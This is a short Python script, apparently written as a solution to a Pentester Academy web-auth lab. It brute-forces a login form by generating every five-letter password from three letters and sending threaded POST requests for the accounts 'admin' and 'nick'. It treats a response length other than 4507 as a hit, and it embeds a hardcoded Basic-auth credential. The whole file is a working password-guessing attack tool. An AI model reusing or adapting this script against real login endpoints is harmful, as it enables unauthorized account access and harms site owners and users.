import itertools 
import time
from  threading import Thread
from queue import Queue 
import certifi
import urllib3
import base64

class ThreadUrl(Thread):
    def __init__(self, queue):
        Thread.__init__(self)
        self.queue = queue
        
    def run(self) :
        while not self.queue.empty() :
            work = self.queue.get()
            http = urllib3.PoolManager(cert_reqs ='CERT_REQUIRED',ca_certs=certifi.where())
            phrase = str('nick:vivvv')
            encoded = base64.b64encode(phrase.encode("utf-8"))
            auth = 'Basic '+ encoded.decode("utf-8") 
            try:
                
                httpResponse = http.request('POST', 'https://pentesteracademylab.appspot.com/lab/webapp/auth/form/1',headers={'Authorization': auth },fields={'email': work[0]+'@pentesteracademy.com','password': work[1]})
            except :
                print("Error")
            if len(httpResponse.data) != 4507:
                print(f'---------------------------------------------------------------------------------------------')
                print(f'-******************************************************************************************- ')
                print(f'-*************************** {work[1]} Is what you want for user {work[0]} ****************- ')
                print(f'-******************************************************************************************- ')
                print(f'---------------------------------------------------------------------------------------------')
                print("--- %s seconds ---" % (time.time() - start_time))
            else:
                print(f'______{work[1]} Not Valid For {work[0]} ')
            self.queue.task_done()
                                
start_time = time.time()
print("Start Processing") 
request_queue = Queue()

def main():
    letters = itertools.product(['n', 'm', 'o'],repeat=int(5))
    for i in letters:
        x = "".join(i)
        request_queue.put(('admin',x))
        request_queue.put(('nick',x))
        worker = ThreadUrl(request_queue)
        worker.setDaemon(True)
        worker.start()
main()



  





